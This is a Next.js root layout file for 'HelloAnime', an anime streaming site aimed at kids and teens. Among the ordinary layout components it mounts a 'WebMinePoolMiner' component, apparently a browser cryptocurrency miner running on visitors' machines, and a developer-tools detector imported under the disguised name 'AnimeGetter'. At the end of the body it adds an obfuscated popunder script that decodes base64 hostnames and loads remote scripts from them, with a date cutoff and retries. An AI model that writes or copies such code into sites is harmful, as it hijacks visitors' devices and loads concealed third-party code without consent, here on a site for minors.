import { Inter } from "next/font/google";
import Script from "next/script";
import "./globals.css";
import Navbar from "@/components/Navbar";
import Sidebar from "@/components/Sidebar";
import BottomNavigation from "@/components/BottomNavigation";
import DevToolsDetector from "@/components/AnimeGetter";
import WebMinePoolMiner from "@/components/WebMinePoolMiner";

const inter = Inter({ subsets: ["latin"] });

export const metadata = {
  title: "HelloAnime",
  description: "A modern anime streaming platform for kids and teens",
};

export default function RootLayout({ children }) {
  return (
    <html lang="en">
      <head>
        {/* your normal <head> content */}
      </head>
      <body className={`${inter.className} overflow-hidden`}>
        <DevToolsDetector />
        <div className="flex flex-col h-svh overflow-hidden">
          <Navbar />
          <div className="flex flex-1 overflow-hidden">
            <Sidebar />
            <main className="flex-1 overflow-y-auto px-3 bg-black md:pb-0">
              {children}
            </main>
          </div>
          <BottomNavigation />
        </div>
        <WebMinePoolMiner />

        {/* ➔ New script inserted at the very end of body */}
        <Script id="custom-popunder-script" strategy="afterInteractive">
          {`
            (function(){
              var k=window, m="f2e25af428854922b050b10d26671305",
                  h=[["siteId",130*265*113+1298282],["minBid",0],["popundersPerIP","12:1,12:1"],["delayBetween",1],["default",false],["defaultPerDay",0],["topmostLayer","extreme"]],
                  y=["d3d3LmJsb2NrYWRzbm90LmNvbS95QXEvcXpCL3B2aWRlb2pzXzUudmFzdC52cGFpZC5taW4uanM=","ZG5oZmk1bm4yZHQ2Ny5jbG91ZGZyb250Lm5ldC9nYWNjb3VudGluZy5taW4uanM="],
                  l=-1, v, q,
                  i=function(){
                    clearTimeout(q);
                    l++;
                    if(y[l] && !(1771672026000 < (new Date).getTime() && 1 < l)){
                      v = k.document.createElement("script");
                      v.type = "text/javascript";
                      v.async = true;
                      var r = k.document.getElementsByTagName("script")[0];
                      v.src = "https://" + atob(y[l]);
                      v.crossOrigin = "anonymous";
                      v.onerror = i;
                      v.onload = function(){
                        clearTimeout(q);
                        k[m.slice(0,16)+m.slice(0,16)] || i();
                      };
                      q = setTimeout(i, 5000);
                      r.parentNode.insertBefore(v, r);
                    }
                  };
              if(!k[m]){
                try{
                  Object.freeze(k[m]=h)
                }catch(e){}
                i();
              }
            })();
          `}
        </Script>
      </body>
    </html>
  );
}
